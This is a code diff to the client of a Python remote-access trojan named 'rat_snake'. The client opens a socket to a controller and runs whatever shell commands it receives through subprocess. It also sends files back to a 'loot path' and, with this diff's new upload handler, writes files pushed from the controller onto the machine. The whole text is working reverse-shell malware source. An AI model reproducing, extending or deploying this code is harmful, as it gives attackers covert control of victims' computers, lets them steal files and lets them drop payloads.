@@ -29,19 +29,24 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         if retry_count > TIMEOUT:
             exit()
 
+    response = ""
     # send current working directory
     working_directory = os.getcwd()
     s.sendall(working_directory.encode(ENCODING))
     while True:
         # get command to run
         command_to_run = s.recv(1024).decode(ENCODING)
+        # print("Going to run this: "+command_to_run)
         # special commands
         if command_to_run[:9] == "rat_snake":
+
             # stop client
+            # rat_snake quit
             if command_to_run[10:] == "quit":
                 response = "special:client_stopped"
                 s.sendall(response.encode(ENCODING))
                 exit()
+
             # send file
             # rat_snake download
             elif command_to_run[10:18] == "download":
@@ -63,13 +68,27 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             # unknown special command or help
             else:
                 response = "unknown special command.\nquit - quits rat_snake and closes client\ndownload <FILE_NAME> - downloads file to loot path"
+
+        # special case to recieve an uploaded file
+        # special:recieve_upload
+        elif command_to_run[:22] == "special:recieve_upload":
+            filename, file_size = command_to_run[23:].split(" ")
+            # print("going to get a file: filename = "+filename+" size = "+file_size)
+            if os.path.exists(filename):
+                index = filename.index(".")
+                filename = filename[:index]+"-copy"+filename[index:]
+            with open(filename, "wb") as file:
+                buffer = s.recv(int(file_size))
+                file.write(buffer)
+            response = "file upload complete"
         # cd case (change directory and send back cwd)
         elif command_to_run[:2] == 'cd':
             try:
                 os.chdir(command_to_run[3:])
                 response = os.getcwd()
-            except FileNotFoundError as error:
+            except Exception as error:
                 response = str(error)
+
         else:
             # else just run the command as normal
             response = subprocess.getoutput(command_to_run)
